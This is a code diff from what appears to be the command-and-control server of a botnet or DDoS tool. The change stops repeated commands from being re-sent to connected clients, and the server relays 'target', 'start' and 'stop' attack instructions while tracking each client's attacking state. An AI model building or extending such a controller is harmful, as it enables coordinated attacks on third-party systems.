@@ -44,6 +44,7 @@ def handle_client(conn: socket.socket, addr):
     state = "stopped"
     ip, port = addr
     conn_name = ip +":"+ str(port)
+    prev_command = ""
     
     while not stop_event.is_set():
         try:
@@ -54,24 +55,25 @@ def handle_client(conn: socket.socket, addr):
             print("")
             print("Client must have disconnected:", addr)
             break
-        if command.split(' ')[0] == "target":
-            if state == "attacking":
-                print("Attack is still going on. Please stop the attack before changing the target.")
-            elif state != "attacking":
-                print("Changing target...")
-                conn.send(command.encode())
-        else: # this block only executes if the command changes the attack state
-            if command == "start" and state != "attacking":
-                state = "attacking"
-                print("command is ", command.encode())
-                conn.send(command.encode())
-            elif command == "stop" and state == "attacking":
-                state = "stopped"
-                print("command is ", command.encode())
-                conn.send(command.encode())
-            with conn_dict_lock:
-                conn_dict[conn_name] = state
-        command = ""
+        if command != prev_command:
+            if command.split(' ')[0] == "target":
+                if state == "attacking":
+                    print("Attack is still going on. Please stop the attack before changing the target.")
+                elif state != "attacking":
+                    print("Changing target...")
+                    conn.send(command.encode())
+            else: # this block only executes if the command changes the attack state
+                if command == "start" and state != "attacking":
+                    state = "attacking"
+                    print("command is ", command.encode())
+                    conn.send(command.encode())
+                elif command == "stop" and state == "attacking":
+                    state = "stopped"
+                    print("command is ", command.encode())
+                    conn.send(command.encode())
+                with conn_dict_lock:
+                    conn_dict[conn_name] = state
+        prev_command = command
 
     conn.close()
     # Decrement the active connection count and remove the connection from the dict
